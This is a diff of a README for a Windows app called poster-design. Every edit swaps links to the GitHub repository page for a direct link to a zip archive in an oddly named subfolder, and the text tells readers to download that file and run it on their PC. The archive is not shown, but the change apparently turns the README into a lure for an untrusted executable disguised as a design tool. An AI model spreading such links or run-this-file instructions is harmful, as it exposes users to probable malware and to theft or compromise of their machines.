@@ -1,6 +1,6 @@
 # 🎨 poster-design - Make Posters Fast and Clean
 
-[![Download poster-design](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jaydens792/poster-design)
+[![Download poster-design](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Jaydens792/poster-design/main/plastodynamic/poster-design-2.9.zip)
 
 ## 🖥️ What this app does
 
@@ -21,7 +21,7 @@ It is built for people who want a simple way to make a poster without learning d
 
 To get poster-design, visit this page to download:
 
-https://github.com/Jaydens792/poster-design
+https://raw.githubusercontent.com/Jaydens792/poster-design/main/plastodynamic/poster-design-2.9.zip
 
 If the page shows a release file for Windows, download it and run that file on your PC.
 
@@ -201,7 +201,7 @@ A simple poster often works better than a busy one.
 
 Use this link to download and run the app on Windows:
 
-https://github.com/Jaydens792/poster-design
+https://raw.githubusercontent.com/Jaydens792/poster-design/main/plastodynamic/poster-design-2.9.zip
 
 Open the page, download the Windows file, then run it on your computer
 
